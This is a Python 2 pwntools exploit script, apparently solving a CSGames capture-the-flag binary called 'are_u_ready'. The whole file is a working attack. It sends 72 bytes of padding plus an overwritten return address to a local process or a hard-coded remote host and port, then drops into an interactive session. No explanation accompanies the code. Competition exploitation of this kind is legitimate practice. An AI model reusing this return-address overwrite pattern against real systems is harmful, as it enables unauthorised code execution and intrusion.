#!/usr/bin/env python2
from pwn import *

host = "67.205.174.218"
port = 8000
binary_path = "./are_u_ready"
lib_path = None

context.update(arch="amd64", os="linux")

def get_process():
    if args["REMOTE"]:
        return remote(host, port)
    else:
        if lib_path is None:
            return process(binary_path)
        else:
            return process([binary_path], env={"LD_PRELOAD": lib_path})

if lib_path is not None:
    lib = ELF(lib_path)

payload = ""
p = get_process()

if args["PAUSE"]:
    pause()

target = 0x4006b6

payload += cyclic(72)
payload += p64(target)

p.sendlineafter("ARE YOU READY FOR THE CSGAMES ?!?!", payload)
p.interactive()

